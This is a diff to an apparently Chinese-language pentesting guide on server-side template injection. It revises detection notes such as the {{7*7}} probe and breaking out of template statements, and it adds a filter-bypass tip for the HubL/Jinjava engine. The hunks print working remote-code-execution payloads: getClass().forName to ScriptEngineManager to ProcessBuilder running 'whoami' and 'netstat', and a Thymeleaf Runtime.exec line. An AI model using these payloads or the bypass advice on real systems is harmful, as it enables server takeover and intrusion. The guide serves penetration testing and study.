@@ -81,8 +81,8 @@ ${{<%[%'"}}%\
 - 抛出错误，可能暴露模板引擎类型
 - Payload 从响应中消失或部分被处理
 - 数学表达式被计算（`{{7*7}}` → `49`）
-- **Plaintext Context**：检查服务端是否计算模板表达式
-- **Code Context**：修改输入参数观察输出是否动态变化
+- **Plaintext Context**：检查服务端是否计算模板表达式（如 `{{7*7}}` → `49`）
+- **Code Context**：输入在模板语句内部（如 `<a title="{{user_input}}">`）。先验证无 XSS，再通过 `}}<tag>` 打破语句边界注入 HTML 标签，确认模板解析器存在
 
 ## 2.2 模板引擎识别 — 决策树
 
@@ -417,7 +417,10 @@ __${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
 {{'a'.toUpperCase()}} → 'A'
 {{ request }} → com.hubspot.content.hubl.context.TemplateContextRequest@23548206
 
-# RCE (已通过 PR#230 修复)
+# 注意：java.lang.Runtime 和 java.lang.System 被 javax.el.BeanELResolver 阻止
+# → 需改用 javax.script.ScriptEngineManager 路径
+
+# RCE (已通过 PR#230 修复 — 禁用 getClass 方法)
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
 
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
